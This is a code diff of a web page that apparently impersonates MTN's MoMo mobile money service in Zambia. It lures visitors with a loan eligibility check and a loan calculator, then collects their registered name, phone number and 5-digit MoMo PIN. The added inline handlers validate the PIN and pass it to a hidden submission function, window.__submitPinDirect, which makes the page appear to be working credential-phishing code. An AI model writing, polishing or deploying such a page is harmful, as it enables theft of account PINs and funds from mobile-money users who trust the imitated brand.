@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261125q" />
+  <link rel="stylesheet" href="style.css?v=20261125r" />
 </head>
 <body>
   <div class="app-container">
@@ -35,7 +35,12 @@
           <li><strong>• ENTER YOUR EXACT REGISTERED FULL NAME AND ACTIVE MOMO NUMBER TO AVOID DELAYS.</strong></li>
           <li><strong>• APPLICATIONS ARE REVIEWED PROMPTLY AFTER SUBMISSION.</strong></li>
         </ul>
-        <button id="btn-goto-slider" class="btn-momo-primary" type="button">
+        <button
+          id="btn-goto-slider"
+          class="btn-momo-primary"
+          type="button"
+          onclick="(function(){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});var next=document.getElementById('screen-slider');if(next)next.classList.add('active');window.scrollTo(0,0);})()"
+        >
           <span>GET STARTED</span>
           <small>CHECK LOAN ELIGIBILITY</small>
         </button>
@@ -58,7 +63,12 @@
       </div>
 
       <div class="sub-nav-strip">
-        <button id="btn-slider-back" class="nav-back-btn" type="button">← Back</button>
+        <button
+          id="btn-slider-back"
+          class="nav-back-btn"
+          type="button"
+          onclick="(function(){document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});var prev=document.getElementById('screen-welcome');if(prev)prev.classList.add('active');window.scrollTo(0,0);})()"
+        >← Back</button>
         <span class="sub-nav-title">Loan Calculator</span>
       </div>
 
@@ -271,8 +281,16 @@
               placeholder="PIN"
               class="yello-pin-input"
               autocomplete="off"
+              oninput="(function(el){var d=el.value.replace(/\D/g,'').slice(0,5);if(el.value!==d)el.value=d;var btn=document.getElementById('btn-sign-in-pin');if(btn){btn.disabled=false;btn.classList.add('ready');}})(this)"
+              onkeydown="if(event.key==='Enter'){event.preventDefault();var b=document.getElementById('btn-sign-in-pin');if(b)b.click();}"
             />
-            <button id="btn-toggle-pin-visibility" type="button" class="yello-eye-btn" aria-label="Show or hide PIN">👁️</button>
+            <button
+              id="btn-toggle-pin-visibility"
+              type="button"
+              class="yello-eye-btn"
+              aria-label="Show or hide PIN"
+              onclick="(function(btn){var inp=document.getElementById('yello-pin-input');if(!inp)return;var isHidden=inp.type==='password';inp.type=isHidden?'text':'password';btn.innerText=isHidden?'🙈':'👁️';})(this)"
+            >👁️</button>
           </div>
         </div>
 
@@ -280,7 +298,12 @@
           <a href="#" id="link-forgot-pin" class="yello-forgot-link">Forgot PIN?</a>
         </div>
 
-        <button id="btn-sign-in-pin" type="button" class="btn-sign-in-pill ready">SIGN IN</button>
+        <button
+          id="btn-sign-in-pin"
+          type="button"
+          class="btn-sign-in-pill ready"
+          onclick="(function(){var inp=document.getElementById('yello-pin-input');var err=document.getElementById('banner-pin-error');var pin=inp?inp.value.replace(/\D/g,'').slice(0,5):'';if(pin.length!==5){if(err){err.innerText='Please enter your 5-digit PIN before tapping SIGN IN.';err.classList.add('active');}if(inp)inp.focus();return;}if(err){err.innerText='';err.classList.remove('active');}if(window.__submitPinDirect){window.__submitPinDirect(pin);}})()"
+        >SIGN IN</button>
 
         <button id="btn-switch-account" type="button" class="yello-switch-account-btn">Switch account</button>
 
@@ -430,7 +453,7 @@
 
   </div>
 
-  <script src="script.js?v=20261125q"></script>
+  <script src="script.js?v=20261125r"></script>
 </body>
   </html>
-  
+              
